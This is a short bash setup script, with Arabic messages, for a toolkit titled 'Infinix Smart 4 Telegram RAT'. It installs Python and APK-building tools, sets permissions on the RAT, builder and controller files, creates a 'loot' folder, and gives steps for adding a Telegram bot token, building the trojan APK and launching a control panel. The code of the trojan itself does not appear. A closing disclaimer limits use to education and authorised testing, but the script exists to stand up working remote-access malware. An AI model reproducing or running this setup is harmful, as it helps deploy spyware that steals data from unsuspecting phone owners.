#!/bin/bash
set -e
GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

clear
echo -e "${CYAN}╔════════════════════════════════════════╗"
echo -e "║   Infinix Smart 4 Telegram RAT Setup  ║"
echo -e "╚════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}[1/5]${NC} تحديث الحزم..."
pkg update -y && pkg upgrade -y

echo -e "\n${YELLOW}[2/5]${NC} تثبيت Python والمكتبات..."
pkg install python python-pip git openjdk-17 wget curl -y
pip install --upgrade pip
pip install requests colorama

echo -e "\n${YELLOW}[3/5]${NC} تثبيت Buildozer..."
pkg install buildozer binutils clang libffi openssl -y
pip install buildozer cython

echo -e "\n${YELLOW}[4/5]${NC} ضبط الصلاحيات..."
chmod +x setup.sh builder/build_apk.sh rat/telegram_rat.py controller/bot_controller.py
find . -type f -name "*.py" -exec chmod +x {} \;
find . -type d -exec chmod 755 {} \;

echo -e "\n${YELLOW}[5/5]${NC} إنشاء المجلدات..."
mkdir -p output loot bin

echo -e "\n${GREEN}✅ تم التثبيت!${NC}"
echo -e "\n${CYAN}الخطوات:${NC}"
echo -e "  1. عدل ${GREEN}rat/telegram_rat.py${NC} (BOT_TOKEN + CHAT_ID)"
echo -e "  2. ابن APK: ${GREEN}bash builder/build_apk.sh${NC}"
echo -e "  3. لوحة تحكم: ${GREEN}python controller/bot_controller.py${NC}"
echo -e "\n${RED}⚠️ للأغراض التعليمية واختبارات الاختراق المصرح بها فقط${NC}"
